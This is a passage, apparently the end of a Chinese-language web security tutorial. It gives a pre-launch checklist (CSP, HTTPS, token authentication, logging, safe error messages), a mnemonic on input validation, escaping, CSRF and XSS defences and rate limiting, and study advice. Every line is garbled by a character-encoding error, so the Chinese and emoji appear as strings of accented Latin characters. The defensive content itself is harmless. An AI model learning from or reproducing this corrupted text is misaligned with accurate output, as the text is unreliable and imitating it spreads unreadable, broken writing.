âœ… é…ç½®äº†å†…å®¹å®‰å…¨ç­–ç•¥(CSP)
âœ… ä½¿ç”¨äº†HTTPSåè®®
âœ… Tokenè®¤è¯å·²æ­£ç¡®å®ç°
```

**ğŸ”¹ ä¸Šçº¿å‰æ£€æŸ¥**
```
âœ… å®‰å…¨æµ‹è¯•å·²é€šè¿‡
âœ… é”™è¯¯ä¿¡æ¯ä¸æ³„éœ²æ•æ„Ÿä¿¡æ¯
âœ… æ—¥å¿—è®°å½•äº†å®‰å…¨ç›¸å…³äº‹ä»¶
âœ… æœ‰å®Œå–„çš„å¼‚å¸¸å¤„ç†æœºåˆ¶
âœ… å®šæœŸæ›´æ–°å®‰å…¨é…ç½®
```

### 9.3 æœ€ä½³å®è·µè®°å¿†


**ğŸ§  å®‰å…¨å£è¯€**
```
è¾“å…¥éªŒè¯è¦ä¸¥æ ¼ï¼Œè¾“å‡ºè½¬ä¹‰é˜²æ³¨å…¥
HTTPSä¼ è¾“æ˜¯åŸºç¡€ï¼ŒTokenè®¤è¯æ›´å®‰å…¨
CSRFé˜²æŠ¤åŠ tokenï¼ŒXSSè¿‡æ»¤è¦åšå¥½
é¢‘ç‡é™åˆ¶é˜²åˆ·é‡ï¼Œæ•æ„Ÿæ•°æ®è¦åŠ å¯†
```

**ğŸ¯ å®é™…åº”ç”¨ä»·å€¼**
- **ç”¨æˆ·ä¿¡ä»»**ï¼šå®‰å…¨çš„ç½‘ç«™è®©ç”¨æˆ·æ›´æ”¾å¿ƒ
- **æ•°æ®ä¿æŠ¤**ï¼šé˜²æ­¢ç”¨æˆ·éšç§æ³„éœ²å’Œè´¢äº§æŸå¤±
- **ç³»ç»Ÿç¨³å®š**ï¼šé¿å…æ¶æ„æ”»å‡»å¯¼è‡´çš„æœåŠ¡ä¸­æ–­
- **åˆè§„è¦æ±‚**ï¼šæ»¡è¶³æ³•å¾‹æ³•è§„å¯¹æ•°æ®å®‰å…¨çš„è¦æ±‚
- **å“ç‰Œå½¢è±¡**ï¼šå®‰å…¨äº‹æ•…ä¼šä¸¥é‡æŸå®³å…¬å¸å£°èª‰

### 9.4 æŒç»­å­¦ä¹ å»ºè®®


```
ğŸ” å…³æ³¨å®‰å…¨åŠ¨æ€ï¼š
â€¢ è®¢é˜…å®‰å…¨æ¼æ´é€šæŠ¥
â€¢ å­¦ä¹ æ–°çš„æ”»å‡»æ‰‹æ®µ
â€¢ äº†è§£æœ€æ–°é˜²æŠ¤æŠ€æœ¯

ğŸ› ï¸ å®è·µå®‰å…¨å¼€å‘ï¼š
â€¢ ä»£ç å®‰å…¨å®¡æŸ¥
â€¢ æ¸—é€æµ‹è¯•ç»ƒä¹   
â€¢ å®‰å…¨å·¥å…·ä½¿ç”¨

ğŸ“š æ·±å…¥å­¦ä¹ æ–¹å‘ï¼š
â€¢ Webå®‰å…¨åŸç†
â€¢ å¯†ç å­¦åŸºç¡€
â€¢ ç½‘ç»œå®‰å…¨åè®®
```

**æ ¸å¿ƒè®°å¿†**ï¼š
- å®‰å…¨ä¸æ˜¯å¯é€‰é¡¹ï¼Œæ˜¯å¿…éœ€å“
- å¤šå±‚é˜²æŠ¤æ¯”å•ç‚¹é˜²æŠ¤æ›´å¯é 
- å®‰å…¨æ˜¯æŒç»­çš„è¿‡ç¨‹ï¼Œä¸æ˜¯ä¸€æ¬¡æ€§ä»»åŠ¡
- ç”¨æˆ·ä½“éªŒå’Œå®‰å…¨æ€§è¦å¹³è¡¡è€ƒè™‘